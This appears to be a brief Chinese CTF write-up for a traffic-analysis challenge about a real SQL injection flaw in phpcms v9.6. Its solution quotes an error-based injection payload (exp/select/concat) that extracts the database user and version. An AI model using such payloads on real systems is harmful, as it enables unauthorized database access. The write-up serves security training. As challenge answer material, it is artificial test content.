## 个人赛-检测

## SQL注入


### 题目描述

某个CMS中存在的漏洞，通过抓取流量了解当前漏洞的类型

### 出题思路

 * phpcmsv9.6 真实数据库注入漏洞


### 题解

 * 在url中可以发现是一个sql注入
 * e*xp(~(se*lect%*2af*rom(se*lect co*ncat(0x6c75616e24,us*er(),0x3a,ver*sion(),0x6c75616e24))x))'
